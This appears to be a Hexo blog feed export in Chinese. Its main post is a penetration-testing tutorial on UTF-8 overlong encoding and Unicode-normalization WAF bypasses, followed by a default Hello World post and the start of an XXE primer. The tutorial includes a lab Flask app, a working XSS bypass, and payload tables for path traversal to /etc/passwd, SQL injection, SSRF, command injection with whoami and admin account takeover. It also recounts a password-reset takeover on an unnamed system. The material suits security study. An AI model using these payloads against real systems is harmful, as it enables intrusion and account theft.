<p>UTF-8 在处理字符的时候，如果遇到正常的 ASCII 字符仍然像往常一样使用一个字节进行编码，解码应用程序通过识别该字节的第一位是否为 <code>0</code> 来判断该字符是否为ASCII字符 。当到达下一个要处理的字节时，如果识别到第一位开始用 <code>1</code> 表示，则下一个字符是使用多字节序列编码的字符。字节数由第一个字节的形式决定（多字节序列编码字符，首字节 <code>1</code> 的个数用于判断编码后的字节长度，然后紧接着以数字 <code>0</code> 作为终结标志）。例如，如果多字节序列的第一个字节的格式为 <code>110x xxxx</code>，则表示下一个符号用双字节表示。类似地，<code>1110 xxxx</code> 表示它是一个三字节序列的开始，<code>1111 0xxx</code> 是一个四字节序列。正如上面，<em><strong>前提知识点二：UTF-8 编码知识</strong></em> 中的 <strong>表5</strong> 所示。你会注意到双字节序列应该在形成 <code>110x xxxx 10xx xxxx</code> 来表示具有二进制数 <code>xxx xxxx xxxx</code> 的 Unicode 代码点，原则上可以是从 <code>000 0000 0000</code> (0) 到 <code>111 1111 1111</code> (2047) 的任何二进制数。在（<code>C0AF</code>）中，二进制值为 <code>1100 0000 1010 1111</code>，它表示代码点 <code>00000101111 = 47 = /</code>。请注意，47 也可以更简单地用一个 ASCII 字符 <code>/</code> 来表示，即位 <code>0010 1111</code>。至于为什么第二个字节定义为以 10 开头,这是由于UTF-8编码的算法原因，具体请仔细看看 <em><strong>前提知识点二：UTF-8 编码知识</strong></em> 中的 <strong>表5</strong> 以及 <strong>编码方法</strong> 。</p>
<p>所以，按照上所述，这好像允许多种方式来表示每个 Unicode 字符，但这在 Unicode 标准中是不允许的。双字节序列(<code>110x xxxx 10xx xxxx</code>)的形式，码点范围应该只允许在 128 和 2047 之间，所以 <code>C0AF</code> 不应该表示为 <code>/</code>， 这是一个错误。但是，Unicode 库通常被要求设计为能够快速地将字符解析出来，人们可能不会考虑安全隐患。因此，某些库可能选择不检查<strong>双序列 Unicode 字符</strong>的码点是否在有效范围内（即使 Unicode 标准禁止这样做）。或者开发人员认为，如果应用程序接收到一个 <code>C0AF</code>，很可能是一些具有格式错误的 UTF-8 应用程序想要发送 <code>2F</code> ，但因为处理错误而导致发送了<code>C0AF</code>。因此决定将 <code>C0AF</code> 解析为 <code>2F</code> 是方便用户的友好及明智的行为。</p>
<p>同样， <code>%C0%2F</code> 也适用于一些大笨蛋 Unicode 库，因为许多解码 Unicode 的应用程序不会检查第二个字节的第一位是否为 <code>1</code>，因为前一个字节已经表明它是一个双字节编码的字符。那就是错误的解码器接受 <code>110x xxxx ??xx xxxx</code> 作为有效的双字节编码的字符，而不管 <code>??</code> 是 <code>10</code> 是作为 UTF8 解析双序列字符的标准要求。第二个字节的前两个字符并不实际影响UTF-8解码结果，我们可认为它们是多余的，因此存在问题的 Unicode 解码应用程序可能决定不检查这些字符是否匹配正确的值。</p>
<p>所以现在我们知道为什么 <code>%C0%AF</code> 和 <code>%C0%2F</code> 最终都使用跳过正确检查的 Unicode 解码器解码为符号 <code>/</code> 。</p>
<p>至于为什么这会成功地允许目录遍历，经常会发生过滤不正确的输入和解码 Unicode 符号是在应用程序的不同阶段完成的。 Web 服务器可能足够安全，不允许某人通过 <code>http://www.example.com/../../../etc/shadow</code> 甚至 <code>http://www.example.com /..%2f..%2f..%2fetc%2fshadow</code>的形式进行攻击。但是，如果 Web 服务器正在提供文件并且解码 unicode 是在防止目录遍历的检查之后完成的，或者由操作系统完成的稍有不同，则此攻击可能会通过过滤器，从而允许攻击起作用。</p>
<h2 id="0x02-unicode-规范化漏洞"><a href="#0x02-unicode-规范化漏洞" class="headerlink" title="0x02- unicode 规范化漏洞"></a>0x02- unicode 规范化漏洞</h2><p>Unicode 兼容是 Unicode 等效的一种形式，它确保在可能具有不同视觉外观或行为的字符或字符序列之间，表示相同的抽象字符。例如，<code>𝕃</code> 归一化为 <code>L</code>。这种行为可能为滥用一些在输入被净化后执行 unicode 兼容性的弱实现打开了大门。</p>
<h3 id="Unicode-兼容性表格"><a href="#Unicode-兼容性表格" class="headerlink" title="Unicode 兼容性表格"></a>Unicode 兼容性表格</h3><p>有四种标准的归一化形式：</p>
<ul>
<li><strong>NFC：</strong> 规范化形式规范组合</li>
<li><strong>NFD：</strong> 规范化形式的规范分解</li>
<li><strong>NFKC：</strong> 规范化形式兼容性组合</li>
<li><strong>NFKD：</strong> 规范化形式兼容性分解</li>
</ul>
<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/1.jpg"></p>
<p><code>NFKC</code> 和 <code>NKFD</code> 是有趣的，因为进行兼容性处理，要了解这种行为，我们可以使用这个 Python 片段：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line">string = <span class="string">&quot;𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃&quot;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFC: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFC&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFD: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFD&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFKC: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFKC&#x27;</span>, string))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;NFKD: &#x27;</span> + unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, string))</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">NFC: 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃</span><br><span class="line">NFD: 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃</span><br><span class="line">NFKC: Leonishan</span><br><span class="line">NFKD: Leonishan</span><br></pre></td></tr></table></figure>

<h3 id="概念证明"><a href="#概念证明" class="headerlink" title="概念证明"></a>概念证明</h3><p>为了演示这种行为，我们创建了一个简单的 Web 应用程序，如果 WAF 没有检测到某些奇怪的字符，它会回显 GET 参数值：</p>
<ul>
<li><strong>server.py</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, request</span><br><span class="line"><span class="keyword">import</span> unicodedata</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Welcome_name</span>():</span><br><span class="line">  name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> waf(name):</span><br><span class="line">    abort(<span class="number">403</span>, description=<span class="string">&quot;XSS Detected&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    name = unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, name) <span class="comment">#NFC, NFKC, NFD, and NFKD</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Test XSS: &#x27;</span> + name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(port=<span class="number">81</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>如果检测到黑名单的字符，应用程序直接中断访问：</p>
<ul>
<li><strong>waf.py</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line">    blacklist = [<span class="string">&quot;~&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;#&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;^&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;+&quot;</span>,<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;\&quot;,&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;&quot;,&quot;&quot;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line">    vuln_detected = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(string <span class="keyword">in</span> <span class="built_in">input</span> <span class="keyword">for</span> string <span class="keyword">in</span> blacklist): </span><br><span class="line">        vuln_detected = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> vuln_detected   </span><br></pre></td></tr></table></figure></li>
</ul>
<p>因此，具有以下有效负载 (<code> &lt;img src=p onerror=&#39;prompt(1)&#39;&gt;</code>) 的请求将被中止：</p>
<ul>
<li><p><strong>Request：</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /?name=%3Cimg%20src=p%20onerror=%27prompt(1)%27%3E</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Response:</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">403</span> FORBIDDEN</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/0.16.0 Python/3.8.1</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 19 Feb 2020 11:11:58 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>XSS Detected<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>审计以下代码行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = unicodedata.normalize(<span class="string">&#x27;NFKD&#x27;</span>, name)</span><br></pre></td></tr></table></figure>

<p>我们可以观察到，在 WAF 分析输入后，服务器正在执行一些 unicode 规范化。因此，与普通 XSS 有效负载相比，标准化后具有相同 unicode 值的有效负载将触发相同的结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Request:</strong></li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /?name=%EF%BC%9Cimg%20src%E2%81%BCp%20onerror%E2%81%BC%EF%BC%87prompt%E2%81%BD1%E2%81%BE%EF%BC%87%EF%B9%A5</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>Response:</strong></li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>41</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: &lt;img src=p onerror=&#x27;prompt(1)&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/2.png"></p>
<p>完美，但是如何找到这些字符？这种方法可以绕过其他漏洞的一些限制吗？</p>
<h3 id="如何找到规范化的字符？"><a href="#如何找到规范化的字符？" class="headerlink" title="如何找到规范化的字符？"></a>如何找到规范化的字符？</h3><p>为了在 unicode 兼容后找到具有相同含义的字符的完整列表，可以使用以下网站：</p>
<ul>
<li><a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></li>
</ul>
<p>可以搜索一个字符，找到兼容后的相同字符。例如，<code>&lt;</code>- <a href="https://www.compart.com/en/unicode/U+003C">https://www.compart.com/en/unicode/U+003C</a></p>
<p><img src="https://jlajara.gitlab.io/assets/images/posts/20200219/3.png"></p>
<p>显示这三个字符 <code>≮ </code>，<code>﹤</code> 和 <code>＜</code>。单击每个后，我们可以在分解部分看到以以下方式标准化：</p>
<ul>
<li><code>≮ </code>- &lt;(U+003C) -  <code>◌̸ </code>(U+0338)</li>
<li><code>﹤</code>- &lt;(U+003C)</li>
<li><code>＜</code>- &lt;(U+003C)</li>
</ul>
<p>在这种情况下， 字符 <code>≮ </code> 将无法实现我们想要的功能，因为它会注入字符 <code>◌̸ </code> (U+0338)， 并将破坏我们的有效负载。</p>
<h3 id="利用其他漏洞"><a href="#利用其他漏洞" class="headerlink" title="利用其他漏洞"></a>利用其他漏洞</h3><p>如果应用程序执行了Unicode规范化，可以尝试制作大量自定义 payload，并在以下漏洞中应用：</p>
<ul>
<li><strong>Path Traversal</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>‥ (U+2025)</td>
<td>‥&#x2F;‥&#x2F;‥&#x2F;etc&#x2F;passwd</td>
<td>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td>︰(U+FE30)</td>
<td>︰&#x2F;︰&#x2F;︰&#x2F;etc&#x2F;passwd</td>
<td>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</td>
</tr>
</tbody></table>
<ul>
<li><strong>SQL Injection</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>＇(U+FF07)</td>
<td>＇ or ＇1＇&#x3D;＇1</td>
<td>’ or ‘1’&#x3D;’1</td>
</tr>
<tr>
<td>＂(U+FF02)</td>
<td>＂ or ＂1＂&#x3D;＂1</td>
<td>” or “1”&#x3D;”1</td>
</tr>
<tr>
<td>﹣ (U+FE63)</td>
<td>admin＇﹣﹣</td>
<td>admin’–</td>
</tr>
</tbody></table>
<ul>
<li><strong>Server Side Request Forgery (SSRF)</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>⓪ (U+24EA)</td>
<td>①②⑦.⓪.⓪.①</td>
<td>127.0.0.1</td>
</tr>
</tbody></table>
<ul>
<li><strong>Open Redirect</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>。(U+3002)</td>
<td>jlajara。gitlab。io</td>
<td>jlajara.gitlab.io</td>
</tr>
<tr>
<td>／(U+FF0F)</td>
<td>／／jlajara.gitlab.io</td>
<td>&#x2F;&#x2F;jlajara.gitlab.io</td>
</tr>
</tbody></table>
<ul>
<li><strong>XSS</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>＜(U+FF1C)</td>
<td>＜script src&#x3D;a／＞</td>
<td>＜script src&#x3D;a&#x2F;&gt;</td>
</tr>
<tr>
<td>＂(U+FF02)</td>
<td>＂onclick&#x3D;＇prompt(1)＇</td>
<td>“onclick&#x3D;’prompt(1)’</td>
</tr>
</tbody></table>
<ul>
<li><strong>Template Injection</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>﹛(U+FE5B)</td>
<td>﹛﹛3+3﹜﹜</td>
<td>6</td>
</tr>
<tr>
<td>［ (U+FF3B)</td>
<td>［［5+5］］</td>
<td>[[5+5]]</td>
</tr>
</tbody></table>
<ul>
<li><strong>OS Command Injection</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>＆ (U+FF06)</td>
<td>＆＆whoami</td>
<td>&amp;&amp;whoami</td>
</tr>
<tr>
<td>｜ (U+FF5C)</td>
<td>｜｜ whoami</td>
<td>||whoami</td>
</tr>
</tbody></table>
<ul>
<li><strong>Arbitrary file upload</strong></li>
</ul>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ｐ (U+FF50) ʰ (U+02B0)</td>
<td>test.ｐʰｐ</td>
<td>test.php</td>
</tr>
</tbody></table>
<ul>
<li><strong>Business logic</strong></li>
</ul>
<p>注册具有与其他用户相似的某些字符的用户。也许注册过程会允许注册，因为这一步的用户没有被规范化并且允许这个字符。之后，假设应用程序在检索到用户数据后执行了一些规范化。</p>
<ol>
<li>注册ªdmin。数据库中没有条目，注册成功。</li>
<li>登录为ªdmin。后端执行规范化并给出admin.</li>
<li>账户接管。</li>
</ol>
<table>
<thead>
<tr>
<th>Character</th>
<th>Payload</th>
<th>After Normalization</th>
</tr>
</thead>
<tbody><tr>
<td>ª (U+00AA)</td>
<td>ªdmin</td>
<td>admin</td>
</tr>
</tbody></table>
<h3 id="识别-Unicode-规范化漏洞"><a href="#识别-Unicode-规范化漏洞" class="headerlink" title="识别 Unicode 规范化漏洞"></a>识别 Unicode 规范化漏洞</h3><p>我们可以通过提交一些特定的异型字符，如：𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃，并查看返回内容是否包含Leonishan，以确定是否存在该漏洞。</p>
<p>提交有效载荷的 URL 编码版本 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃 ( %F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83) 会给出以下响应：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>19</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: Leonishan</span></span><br></pre></td></tr></table></figure>

<p>因此，进行了 unicode 兼容性 ✅</p>
<p>如果我们提交有效载荷并且响应如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"></span><br><span class="line"><span class="language-subunit"><span class="keyword">Test </span>XSS: ðâð¤ðâð°ð¥ðð</span></span><br></pre></td></tr></table></figure>

<p>不执行 Unicode 兼容性 ❌</p>
<p>注意：如果要使用 BurpSuite 执行此测试，则必须首先对有效负载进行 URL 编码。Burp 的编辑器不能正确处理多字节字符。</p>
<h3 id="一次真实的简单测试"><a href="#一次真实的简单测试" class="headerlink" title="一次真实的简单测试"></a>一次真实的简单测试</h3><p>对某系统的忘记密码功能进行测试，发现 account 参数存在 Unicode 兼容解析。注册一个与真实账号（<code>44***31992************</code>） 类似的账号<code>44***³1992************</code> ，账户信息手机号码处填写攻击者的手机号码。执行忘记密码流程，账户填写 <code>44***³1992************</code>，攻击者手机能成功接收重置后的密码。使用重置后的密码登陆真实账号<code>44***31992************</code>，成功登陆。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220413200326.png"></p>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.runoob.com/w3cnote/charset-encoding.html/">https://www.runoob.com/w3cnote/charset-encoding.html\</a><br><a href="https://blog.csdn.net/hyongilfmmm/article/details/112045049/">https://blog.csdn.net/hyongilfmmm/article/details/112045049\</a><br><a href="https://cloud.tencent.com/developer/article/1470820/">https://cloud.tencent.com/developer/article/1470820\</a><br><a href="https://www.jianshu.com/p/4b6861e22df7/">https://www.jianshu.com/p/4b6861e22df7\</a><br><a href="https://www.cnblogs.com/benbenalin/p/6921553.html/">https://www.cnblogs.com/benbenalin/p/6921553.html\</a><br><a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work/">https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work\</a><br><a href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Unicode</tag>
        <tag>UTF-8</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/03/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>XXE漏洞知识</title>
    <url>/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="XXE-XEE-XML-External-Entity"><a href="#XXE-XEE-XML-External-Entity" class="headerlink" title="XXE - XEE - XML External Entity"></a>XXE - XEE - XML External Entity</h1><p>XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。</p>
<h2 id="XML-Basics"><a href="#XML-Basics" class="headerlink" title="XML Basics"></a>XML Basics</h2><p><strong>Most of this part was taken from this amazing Portswigger page:</strong> <a href="https://portswigger.net/web-security/xxe/xml-entities"><strong>https://portswigger.net/web-security/xxe/xml-entities</strong></a></p>
<h3 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML? "></a>什么是 XML? <a href="#what-is-xml" id="what-is-xml"></a></h3><p>XML 代表“可扩展标记语言”。 XML 是一种设计用于存储和传输数据的语言。与 HTML 一样，XML 使用标签和数据的树状结构。与 HTML 不同，XML 不使用预定义的标签，因此可以为标签指定描述数据的名称。在 Web 历史的早期，XML 作为一种数据传输格式很流行（“AJAX”中的“X”代表“XML”）。 但它的受欢迎程度现在已经下降，后继者为JSON。.</p>
<h3 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体? "></a>什么是实体? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a></h3><p>XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。 XML 语言的规范中内置了各种实体。例如，实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code> 表示字符 <code>&lt;</code> 和 <code>&gt;</code>。这些是用于表示 XML 标记的元字符（类似编程语言中的关键字），因此当它们出现在数据中时，通常必须使用它们的实体来表示。</p>
<h4 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h4><ol>
<li>字符实体<ol>
<li>预定义字符实体</li>
<li>编号字符实体</li>
<li>命名字符实体</li>
</ol>
</li>
<li>内部实体（又称：命名实体）</li>
<li>外部实体</li>
<li>参数实体<ol>
<li>外部参数实体</li>
<li>内部参数实体</li>
</ol>
</li>
</ol>
<h4 id="理解实体"><a href="#理解实体" class="headerlink" title="理解实体"></a>理解实体</h4><ol>
<li><strong>字符实体：</strong> 字符实体，我们可以用十进制格式（&amp;#nnn;，其中 nnn 是字符的十进制值）或十六进制格式（&amp;#xhhh;，其中hhh 是字符的十六进制值）来指定任意 Unicode 字符。其中上面提及的 <em>“实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code> 表示字符 <code>&lt;</code> 和 <code>&gt;</code>”</em> 就是字符实体中预定义字符实体的一种。</li>
<li><strong>内部实体：</strong> 命名实体（在 XML 规范中也称为内部实体）就是我们在谈论 “实体” 时所指的实体。命名实体在 DTD 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。</li>
<li><strong>外部实体：</strong> 外部实体表示外部文件的内容。外部实体在有些情况下很有用，比如说，您在创建一本图书并且想将每一章存储为一个单独的文件。</li>
<li><strong>参数实体：</strong> 参数实体用 <code>% name</code> 申明，引用时用 <code>%name;</code> ，只能在DTD中申明，DTD中引用。其余实体直接用 name 申明，引用时用 <code>&amp;name;</code>，只能在 DTD 中申明，可在xml文档中引用</li>
</ol>
<h3 id="什么是-elements"><a href="#什么是-elements" class="headerlink" title="什么是 elements?"></a>什么是 elements?</h3><p>元素类型声明为 XML 文档中可能出现的元素的类型和数量、哪些元素可能出现在彼此内部以及它们必须出现的顺序设置了规则。例如：</p>
<ul>
<li><code>&lt;!ELEMENT stockCheck ANY&gt;</code> 表示父元素中可以插入任意对象 <code>&lt;stockCheck&gt;&lt;/stockCheck&gt;</code></li>
<li>&lt;!ELEMENT stockCheck EMPTY&gt; 表示应该为空 <code>&lt;stockCheck&gt;&lt;/stockCheck&gt;</code></li>
<li>&lt;!ELEMENT stockCheck (productId,storeId)&gt; 声明 <code>&lt;stockCheck&gt;</code> 应有两个子元素 <code>&lt;productId&gt;</code> 和 <code>&lt;storeId&gt;</code></li>
</ul>
<h3 id="什么是文档类型定义（DTD）"><a href="#什么是文档类型定义（DTD）" class="headerlink" title="什么是文档类型定义（DTD）? "></a>什么是文档类型定义（DTD）? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a></h3><p>XML 文档类型定义 (DTD) 包含可以定义 XML 文档的结构、它可以包含的数据值的类型以及其他项的声明。 DTD 在 XML 文档开头的可选 <code>DOCTYPE</code> 元素中声明。 DTD 可以完全独立于文档本身（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），也可以是两者的混合。</p>
<h3 id="什么是-XML-自定义实体"><a href="#什么是-XML-自定义实体" class="headerlink" title="什么是 XML 自定义实体 ? "></a>什么是 XML 自定义实体 ? <a href="#what-are-xml- custom-entities" id="what-are-xml-custom-entities"></a></h3><p>XML 允许在 DTD 中定义自定义实体。例如：</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code></p>
<p>此定义意味着在 XML 文档中对实体引用 <code>&amp;myentity;</code> 的任何使用都将替换为定义的值：“<code>my entity value</code>”。</p>
<h3 id="什么是-XML-外部实体"><a href="#什么是-XML-外部实体" class="headerlink" title="什么是 XML 外部实体? "></a>什么是 XML 外部实体? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a></h3><p>XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 之外。</p>
<p>外部实体的声明使用 <code>SYSTEM</code> 关键字，并且必须指定应从其加载实体值的 URL。例如：</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code></p>
<p>The URL can use the <code>file://</code> protocol, and so external entities can be loaded from file. For example:</p>
<p><code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code></p>
